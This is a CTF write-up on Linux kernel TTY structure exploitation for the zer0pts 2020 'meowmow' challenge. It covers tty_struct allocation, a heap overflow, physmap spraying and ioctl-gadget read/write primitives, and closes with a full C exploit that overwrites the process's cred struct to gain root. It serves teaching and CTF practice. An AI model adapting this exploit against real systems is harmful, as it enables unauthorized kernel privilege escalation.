[EN](./tty_exploit.md) | [ZH](./tty_exploit-zh.md)
## TTY structure exploitation

This article describes a technique to get stable arbitrary/read write if you become capable of hijakcing a `tty_struct`. The general idea is to overwrite the function pointer of the `ioctl` with special ROP gadgets.

### About TTY
TTY is an abbreivation of the term 'teletypewriter'. A TTY device usually refers to terminal connections to a linux machine. To check out further information about TTY devices, take a look at [this](https://www.oreilly.com/library/view/linux-device-drivers/0596005903/ch18.html) reference.

To view all TTY devices currently in use, run `cat /proc/tty/drivers` on your shell.

```
$ cat /proc/tty/drivers
/dev/tty             /dev/tty        5       0 system:/dev/tty
/dev/console         /dev/console    5       1 system:console
/dev/ptmx            /dev/ptmx       5       2 system
/dev/vc/0            /dev/vc/0       4       0 system:vtmaster
ttyprintk            /dev/ttyprintk   5       3 console
max310x              /dev/ttyMAX   204 209-224 serial
serial               /dev/ttyS       4 64-111 serial
pty_slave            /dev/pts      136 0-1048575 pty:slave
pty_master           /dev/ptm      128 0-1048575 pty:master
unknown              /dev/tty        4 1-63 console
```

### /dev/ptmx
The man page of /dev/ptmx states the following.
```
NAME
       ptmx, pts - pseudoterminal master and slave

DESCRIPTION
       The  file  /dev/ptmx  is a character file with major number 5 and minor
       number 2, usually of mode 0666 and owner.group  of  root.root.   It  is
       used to create a pseudoterminal master and slave pair.

       When  a  process opens /dev/ptmx, it gets a file descriptor for a pseu‐
       doterminal master (PTM), and a pseudoterminal  slave  (PTS)  device  is
       created  in  the  /dev/pts directory.  Each file descriptor obtained by
       opening /dev/ptmx is an independent PTM with its  own  associated  PTS,
       whose path can be found by passing the file descriptor to ptsname(3).

       Before  opening  the  pseudoterminal  slave, you must pass the master's
       file descriptor to grantpt(3) and unlockpt(3).

       Once both the pseudoterminal master and slave are open, the slave  pro‐
       vides  processes  with an interface that is identical to that of a real
       terminal.

       Data written to the slave is presented on the master file descriptor as
       input.  Data written to the master is presented to the slave as input.

       In  practice, pseudoterminals are used for implementing terminal emula‐
       tors such as xterm(1), in which data read from the pseudoterminal  mas‐
       ter  is  interpreted by the application in the same way a real terminal
       would interpret the data, and for  implementing  remote-login  programs
       such  as  sshd(8), in which data read from the pseudoterminal master is
       sent across the network to a client program that is connected to a ter‐
       minal or terminal emulator.

       Pseudoterminals  can  also  be used to send input to programs that nor‐
       mally refuse to read input from pipes (such as su(1), and passwd(1)).
```

To sum up, open("/dev/ptmx") will return the file descriptor to the tty master, and a tty slave will be created under the directory /dev/pts. We can verify this to be true by reading the [source code of the linux kernel](https://elixir.bootlin.com/linux/latest/source/drivers/tty/pty.c#L811).

Let's take a look at the source of `ptmx_open`, to see what is done in the kernel when open("/dev/ptmx") is done in userspace.

```c
static int ptmx_open(struct inode *inode, struct file *filp)
{
	struct pts_fs_info *fsi;
	struct tty_struct *tty;
	struct dentry *dentry;
	int retval;
	int index;

	nonseekable_open(inode, filp);

	/* We refuse fsnotify events on ptmx, since it's a shared resource */
	filp->f_mode |= FMODE_NONOTIFY;

	retval = tty_alloc_file(filp);
	if (retval)
		return retval;

	fsi = devpts_acquire(filp);
	if (IS_ERR(fsi)) {
		retval = PTR_ERR(fsi);
		goto out_free_file;
	}

	/* find a device that is not in use. */
	mutex_lock(&devpts_mutex);
	index = devpts_new_index(fsi); /* [1] */
	mutex_unlock(&devpts_mutex);

	retval = index;
	if (index < 0)
		goto out_put_fsi;


	mutex_lock(&tty_mutex);
	tty = tty_init_dev(ptm_driver, index); /* [2] */
	/* The tty returned here is locked so we can safely
	   drop the mutex */
	mutex_unlock(&tty_mutex);

	retval = PTR_ERR(tty);
	if (IS_ERR(tty))
		goto out;

	/*
	 * From here on out, the tty is "live", and the index and
	 * fsi will be killed/put by the tty_release()
	 */
	set_bit(TTY_PTY_LOCK, &tty->flags); /* LOCK THE SLAVE */
	tty->driver_data = fsi;

	tty_add_file(tty, filp);

	dentry = devpts_pty_new(fsi, index, tty->link); /* [3] */
	if (IS_ERR(dentry)) {
		retval = PTR_ERR(dentry);
		goto err_release;
	}
	tty->link->driver_data = dentry;

	retval = ptm_driver->ops->open(tty, filp);
	if (retval)
		goto err_release;

	tty_debug_hangup(tty, "opening (count=%d)\n", tty->count);

	tty_unlock(tty);
	return 0;
// ...
}
```

In [1], a new index for /dev/pts is allocated atomically. in [2], a new tty device (the master device) is created. In [3], the entry /dev/pts/* is created, where * is the newly allocated index in [1]. We can see that a reference to the master device is passed to `devpts_pty_new` in [3]. This implies that when opening the slave pair, it will use the same `tty_struct` allocated for the master.

Let's take a look at the fucntion `tty_init_dev` further.

```c
struct tty_struct *tty_init_dev(struct tty_driver *driver, int idx)
{
	struct tty_struct *tty;
	int retval;

	/*
	 * First time open is complex, especially for PTY devices.
	 * This code guarantees that either everything succeeds and the
	 * TTY is ready for operation, or else the table slots are vacated
	 * and the allocated memory released.  (Except that the termios
	 * may be retained.)
	 */

	if (!try_module_get(driver->owner))
		return ERR_PTR(-ENODEV);

	tty = alloc_tty_struct(driver, idx);
	if (!tty) {
		retval = -ENOMEM;
		goto err_module_put;
	}

	tty_lock(tty);
	retval = tty_driver_install_tty(driver, tty);
	if (retval < 0)
		goto err_free_tty;

	if (!tty->port)
		tty->port = driver->ports[idx];

	if (WARN_RATELIMIT(!tty->port,
			"%s: %s driver does not set tty->port. This would crash the kernel. Fix the driver!\n",
			__func__, tty->driver->name)) {
		retval = -EINVAL;
		goto err_release_lock;
	}

	retval = tty_ldisc_lock(tty, 5 * HZ);
	if (retval)
		goto err_release_lock;
	tty->port->itty = tty;

	/*
	 * Structures all installed ... call the ldisc open routines.
	 * If we fail here just call release_tty to clean up.  No need
	 * to decrement the use counts, as release_tty doesn't care.
	 */
	retval = tty_ldisc_setup(tty, tty->link);
	if (retval)
		goto err_release_tty;
	tty_ldisc_unlock(tty);
	/* Return the tty locked so that it cannot vanish under the caller */
	return tty;
	// ...
}
```

We can see that a call to `alloc_tty_struct` is made.

```c
struct tty_struct *alloc_tty_struct(struct tty_driver *driver, int idx)
{
	struct tty_struct *tty;

	tty = kzalloc(sizeof(*tty), GFP_KERNEL);
	if (!tty)
		return NULL;

	kref_init(&tty->kref);
	tty->magic = TTY_MAGIC;
	if (tty_ldisc_init(tty)) {
		kfree(tty);
		return NULL;
	}
	tty->session = NULL;
	tty->pgrp = NULL;
	mutex_init(&tty->legacy_mutex);
	mutex_init(&tty->throttle_mutex);
	init_rwsem(&tty->termios_rwsem);
	mutex_init(&tty->winsize_mutex);
	init_ldsem(&tty->ldisc_sem);
	init_waitqueue_head(&tty->write_wait);
	init_waitqueue_head(&tty->read_wait);
	INIT_WORK(&tty->hangup_work, do_tty_hangup);
	mutex_init(&tty->atomic_write_lock);
	spin_lock_init(&tty->ctrl_lock);
	spin_lock_init(&tty->flow_lock);
	spin_lock_init(&tty->files_lock);
	INIT_LIST_HEAD(&tty->tty_files);
	INIT_WORK(&tty->SAK_work, do_SAK_work);

	tty->driver = driver;
	tty->ops = driver->ops;
	tty->index = idx;
	tty_line_name(driver, idx, tty->name);
	tty->dev = tty_get_device(tty);

	return tty;
}
```

And it uses `kzalloc` to allocate the structure on the kernel heap.

We can sum it up in 3 sentences.
```
1. Opening /dev/ptmx allocates a tty_struct on the heap.
2. Opening /dev/ptmx creates a /dev/pts/* entry.
3. The file descriptor created by opening /dev/ptmx and its corresponding /dev/pts/* entry shares the tty_struct.
```


### Meowmow
A challenge from zer0pts CTF 2020. [files]()

### Analysis
The bug is a kernel heap buffer overread and overwrite. IDA analysis reveals the bug quickly.

```c
#define MAX_SIZE 0x400
static int mod_open(struct inode *inode, struct file *file)
{
  if (memo == NULL) {
    memo = kmalloc(MAX_SIZE, GFP_KERNEL);
    memset(memo, 0, MAX_SIZE);
  }
  return 0;
}
static ssize_t mod_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos)
{
  if (filp->f_pos < 0 || filp->f_pos >= MAX_SIZE) return 0;
  if (count < 0) return 0;
  if (count > MAX_SIZE) count = MAX_SIZE - *f_pos;
  if (copy_to_user(buf, &memo[filp->f_pos], count)) return -EFAULT;
  *f_pos += count;
  return count;
}

static ssize_t mod_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos)
{
  if (filp->f_pos < 0 || filp->f_pos >= MAX_SIZE) return 0;
  if (count < 0) return 0;
  if (count > MAX_SIZE) count = MAX_SIZE - *f_pos;
  if (copy_from_user(&memo[filp->f_pos], buf, count)) return -EFAULT;
  *f_pos += count;
  return count;
}
```

Since the kmalloc'ed size is 0x400, it shares the `kmem_cache` with all objects in size range 0x201~0x400. The kernel version is 4.19.98 (can be checked using `uname -a`, and the `tty_struct` is 0x2C0 bytes in that version. Therefore, the `tty_struct` shares the `kmem_cache` with the `memo` buffer. We can check this easily by building a kernel module for the corresponding version and disassembling it. An example is below. 

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/mm_types.h>
#include <linux/slab_def.h>
#include <linux/tty.h>
#include <linux/pipe_fs_i.h>
#include <asm/syscalls.h>

static int __init lkm_example_init(void) {
    printk(KERN_INFO "size: %lx\n", sizeof(tty_struct));
    return 0;
}
static void __exit lkm_example_exit(void) {
    printk(KERN_INFO "Goodbye, World!\n");
}

module_init(lkm_example_init);
module_exit(lkm_example_exit);
```

Also, the heap layout is set up like the following diagram. It is very easy to exploit because a free chunk is contiguously allocated next to `memo`, and overwriting it allows us to get an arbitrary allocation primitive.

```
+----------------------------------+----------------------------------+-------------------------------+
|                                  |                                  |                               |
|               memo               | ptr1                             | ptr2                          |
|                                  |                                  |                               |
+----------------------------------+-+----------------------------------+-----------------------------+
                                     |                                ^ |                             ^
                                     |                                | |                             |
                                     |                                | |                             |
                                     +--------------------------------+ +-----------------------------+

```

### Physmap Spray
Physmap spray is a topic already discussed in many resources. The idea is that if we mmap lots of pages in userspace, we can break kASLR. The [idea](https://pdfs.semanticscholar.org/8a85/23cdabf90dd9abf45dd99452fbb44277bb1d.pdf) is similar to that of heap spray. If we have a kernel heap address, the accuracy becomes nearly 100%, because the physmap region contains the kernel heap region.

So, our exploit process becomes like the following.

```
1. Leak a heap address using the buffer over read.
2. Mmap 32*32*32 pages in userspace.
3. Overwrite the freelist fd to a 'guessed address' using buffer over write.
4. Open /dev/ptmx => tty_struct will be allocated at 'guessed address'
```

We can scan all mmap'ed pages to check if there are any non zero-pages to locate the `tty_struct`. Afterwards, reading/writing from that page will have the same effect as reading/writing from the `tty_struct` in kernel space.

### Leaking kernel base
By reading from offset 0x18, we can leak the `fops` pointer, and using this we can calculate the kernel base.

### Getting RIP control
Since we know a heap address whose contents are controllable, we can forge a fake `fops` pointer there. By filling `memo` with 0xdeadbeef and setting `fops` to the address of `memo` and closing the master tty's file descriptor we can get a crash at 0xdeadbeef.

### Getting arbitrary read/write
**This is the main and most important part**. In the challenge, SMEP/SMAP/kPTI were all enabled. Therefore, we can't jump to code in userspace or perform a kernel ROP/JOP. However, it is possible obtain an arbitrary read/write in a unique way.

The signature of the `ioctl` function is the following.
```c
unsigned int ioctl(struct tty_struct *tty, unsigned int cmd, unsigned long arg)
```

The last 2 arguments, `cmd` and `arg` are completely user controlled, although `cmd` is 4 bytes only. Therefore overwriting `ioctl` function pointer with `mov dword ptr [rdx], esi; ret;` can give us an arbitrary 4 byte write.

Similarly, we can obtain a 4 byte arbtirary read by overwriting `ioctl` function pointer with `mov rax, qword ptr [rdx + 0x28]; ret;`. We can set arg to `<address we want to read from> - 0x28`, and we will get 4 bytes stored at that address as the return value of `ioctl`.

Since we want to use both of these primitives, we need to modify `fops` multiple times.

### Getting uid0
Starting from `init_task`, we can iterate all the tasks until the `pid` of the `task_struct` matches the pid obtained by `getpid()`. Then, we can overwrite `uid`, `guid`, `euid` of `cred` and become root.

```c
unsigned long cur = init_task, cred;
    unsigned int pid;
    unsigned int this_pid = getpid();
    while(1) {
        pid = read32(cur + PID_OFFSET);
        if (pid == this_pid) {
            cred = read64(cur + CRED_OFFSET);
            LOG("Found current process(pid=%d)'s cred struct %p\n", pid, (void *)cred);
            LOG("original uid=%d, gid=%d. now escalating to root\n", read32(cred + 4), read32(cred + 8));
            write64(0x0, cred + 4);
            write64(0x0, cred + 12);
            write64(0x0, cred + 20);
            write64(0x0, cred + 28);
            LOG("now i am uid=%d\n", getuid());
            break;
        }
        cur = read64(cur + TASKS_OFFSET) - TASKS_OFFSET;
    }
```

### Overall
The core idea is to overwrite `ioctl` function pointer with gadgets that take advantage of the fact that RDX, ESI is user controlled and the final value of EAX is visible in userspace. Using this property we bulid a stable arbitrary read write primitive to get uid0. 

Also, the two gadgets used for the exploit have a high chance of existing, because they are 3 bytes only and the kernel code section is huge.

This is my exploit code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <pty.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

#define LOG(f_, ...) printf(("[*] " f_), __VA_ARGS__)
#define SPRAY_CNT 32*32*32
#define PAGESIZE 0x1000
#define TASKS_OFFSET 0x388
#define CRED_OFFSET 0x620
#define PID_OFFSET 0x488
void *sprayed_pages[SPRAY_CNT];
char zeropage[PAGESIZE];

int fd;
int slave_fd;
unsigned long kernel_base;
unsigned long r_gadget;
unsigned long w_gadget;
unsigned long init_task;
unsigned long setup_disble_smap;
unsigned long ftable[0x80];

struct skewBuf {
	unsigned char blank;
	unsigned long vec[127];
	unsigned char leftover[7];
}  __attribute__((packed));

int Open(const char *fname, int mode) {
	int fd = open(fname, mode);
	if (fd < 0) {
		perror("open");
		exit(-1);
	}
	return fd;
}

size_t Read(int fd, void *buf, size_t nbytes) {
	size_t nb = read(fd, buf, nbytes);
	if (nb != nbytes) {
		perror("read");
		exit(-1);
	}
	return nb;
}

size_t Write(int fd, void *buf, size_t nbytes) {
	size_t nb = write(fd, buf, nbytes);
	if (nb != nbytes) {
		perror("write");
		exit(-1);
	}
	return nb;
}

void physmap_spray() {
	int i;
	void *mp;
	for (i = 0; i < SPRAY_CNT; i++)
	{
        if ((mp = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0 )) == MAP_FAILED) {
        	perror("mmap");
        	exit(-1);
        }
		sprayed_pages[i] = mp;
	}	
}

unsigned long get_pfn(void *pg) {
	unsigned long pginfo;
	int fd = Open("/proc/self/pagemap", O_RDWR);
	if (lseek(fd, ((off_t)pg >> 12) * sizeof(pginfo), SEEK_SET) < 0) {
		perror("lseek");
		exit(-1);
	}

	if (read(fd, &pginfo, sizeof(pginfo)) < 0) {
		perror("read");
		exit(-1);
	}
	close(fd);
	unsigned long pfn = pginfo & 0x7fffffffffffff;
	return pfn;
}

void list_pfn() {
	int i;
	for (i = 0; i < SPRAY_CNT; i++) {
		printf("PFN[%d] = %lx\n", i, get_pfn(sprayed_pages[i]));
	}
}

void *page_hit() {
	int i;
	for (i = 0; i < SPRAY_CNT; i++) {
		if (memcmp(sprayed_pages[i], zeropage, PAGESIZE)) {
			return sprayed_pages[i];
		}
	}
	return NULL;
}

int get_ptmx_slave(int ptmx_fd) {
	const char *pts_name;
	if (grantpt(ptmx_fd) < 0) {
		perror("grantpt");
		exit(-1);
	}
	if (unlockpt(ptmx_fd) < 0) {
		perror("unlockpt");
		exit(-1);
	}

	pts_name = (const char *)ptsname(ptmx_fd);
	return Open(pts_name, O_RDWR|O_NOCTTY);
}

unsigned int sys_ioctl(int fd, int cmd, unsigned long aux) {
	asm volatile("mov $16, %rax");
	asm volatile("syscall");
}

void write32(unsigned int what, unsigned long where) {
	ftable[0] = kernel_base + 0xffffffff81419300 - 0xffffffff80e00000;
	ftable[3] = kernel_base + 0xffffffff81418e60 - 0xffffffff80e00000;
	ftable[12] = w_gadget;
	lseek(fd, 0, SEEK_SET);
	Write(fd, ftable, 0x400);
	ioctl(slave_fd, (what), (where)); 
}

unsigned int read32(unsigned long where) {
	ftable[0] = kernel_base + 0xffffffff81419300 - 0xffffffff80e00000;
	ftable[3] = kernel_base + 0xffffffff81418e60 - 0xffffffff80e00000;
	ftable[12] = r_gadget;
	lseek(fd, 0, SEEK_SET);
	Write(fd, ftable, 0x400);
	return sys_ioctl(slave_fd, 0x1, where - 0x28); 
}

void write64(unsigned long what, unsigned long where) {
	unsigned long part;
	part = what & 0xFFFFFFFF;
	write32((unsigned int )part, where);
	part = what >> 32;
	write32((unsigned int )part, where + 4);
}

unsigned long read64(unsigned long where) {
	unsigned long p1, p2;
	p1 = read32(where);
	p2 = read32(where + 4);
	return p1 | (p2 << 32);
}

int check_page(unsigned long addr) {

	unsigned long page[0x101];
	int i;

	for (i = 0; i < 0x101; i++) {
		page[i] = read64(addr + i*8);
	}
	for (i = 0; i < 0x100; i++) {
		if (((page[i] & 0xff) != 0x67) || (!(page[i] >> 63))) {
			return 0;
		}
	}

	return page[0x100] == 0;
}

int main(int argc, char **argv) {

	char trash[0x3FF];
	struct skewBuf buf;
	int i;

	assert(sizeof(buf) == 0x400);
	memset(trash, 0xcc, sizeof(trash));

	// open the device
	fd = Open("/dev/memo", O_RDWR);
	
	// leak a SLAB address
	Write(fd, trash, sizeof(trash));
	Read(fd, &buf, sizeof(buf));
	unsigned long heapAddr = buf.vec[0];
	LOG("Got a kernel heap leak: %p\n", (void *)heapAddr);

	// overwrite the fd of next chunk to a 'guess'ed physmap address
	
	lseek(fd, 0x3FF, SEEK_SET);
	buf.vec[0] = heapAddr & 0xffffffffff000000;
	LOG("tty_struct will be allocated at address: %p\n", (void *)buf.vec[0]);
	Write(fd, &buf, sizeof(buf));

	// physmap spray
	physmap_spray();

	// allocate a ptmx object, it will be allocated to userspace mmap pages
	int tty_fd = Open("/dev/ptmx", O_RDWR|O_NOCTTY);
	unsigned long*pg = page_hit();
	if (!pg) {
		puts("[-] failed to get a tty_struct allocated in one of our pages");
		exit(-1);
	}

	LOG("now page %p is synonymous with tty_struct of fd %d\n", pg, tty_fd);

	// create fake fops
	// 0xffffffff810a0333: mov dword ptr [rdx], esi; ret; 
	// 0xffffffff81051543: mov rax, qword ptr [rdx + 0x28]; ret; 
	unsigned long fops = pg[3];
	kernel_base = fops - 0xffffffff81e65800 + 0xffffffff80e00000;
	w_gadget = kernel_base + 0xffffffff810a0333 - 0xffffffff80e00000;
	r_gadget = kernel_base + 0xffffffff81051543 - 0xffffffff80e00000;
	init_task = kernel_base + 0xFFFFFFFF82211740 - 0xffffffff80e00000;
	setup_disble_smap = kernel_base + 0xffffffff8a98f556 - 0xffffffff80e00000;

	for (i = 0; i < 0x80; i++) {
		ftable[i] = 0xdead0000 + i;
	}
	/*
	0xffffffff81e65800:	0xffffffff81419300	0xffffffff81419840
	0xffffffff81e65810:	0xffffffff81418ee0	0xffffffff81418e60
	0xffffffff81e65820:	0xffffffff814191a0	0x0000000000000000
	0xffffffff81e65830:	0xffffffff81419190	0xffffffff81419100
	0xffffffff81e65840:	0x0000000000000000	0x0000000000000000
	0xffffffff81e65850:	0xffffffff81419660	0xffffffff81418e50
	0xffffffff81e65860:	0x0000000000000000	0x0000000000000000
	0xffffffff81e65870:	0xffffffff81418f80	0x0000000000000000
	0xffffffff81e65880:	0xffffffff814190e0	0xffffffff814195f0
	*/
	ftable[0] = kernel_base + 0xffffffff81419300 - 0xffffffff80e00000;
	ftable[3] = kernel_base + 0xffffffff81418e60 - 0xffffffff80e00000;
	ftable[4] = kernel_base + 0xffffffff814191a0 - 0xffffffff80e00000;
	lseek(fd, 0, SEEK_SET);
	Write(fd, ftable, 0x400);
	
	LOG("fops is located at: %p\n", (void *)fops);
	LOG("kernel base: %p\n", (void *)kernel_base);

	pg[3] = heapAddr - 0x800; // memo address
	
	// enjoy arbitrary read and write
	slave_fd = get_ptmx_slave(tty_fd);

	unsigned long cur = init_task, cred;
	unsigned int pid;
	unsigned int this_pid = getpid();
	while(1) {
		pid = read32(cur + PID_OFFSET);
		if (pid == this_pid) {
			cred = read64(cur + CRED_OFFSET);
			LOG("Found current process(pid=%d)'s cred struct %p\n", pid, (void *)cred);
			LOG("original uid=%d, gid=%d. now escalating to root\n", read32(cred + 4), read32(cred + 8));
			write64(0x0, cred + 4);
			write64(0x0, cred + 12);
			write64(0x0, cred + 20);
			write64(0x0, cred + 28);
			LOG("now i am uid=%d\n", getuid());
			break;
		}
		cur = read64(cur + TASKS_OFFSET) - TASKS_OFFSET;
	}
	
	char flag[0x100];
	FILE *fp = fopen("/flag", "r");
	if (!fp) {
		perror("fopen");
		exit(-1);
	}
	fgets(flag, sizeof(flag), fp);
	printf("flag: %s\n", flag);

	return 0;
}
```

### References
https://www.oreilly.com/library/view/linux-device-drivers/0596005903/ch18.html

https://pr0cf5.github.io/ctf/2020/03/09/the-plight-of-tty-in-the-linux-kernel.html

https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/pwn/Race

https://www.usenix.org/node/184468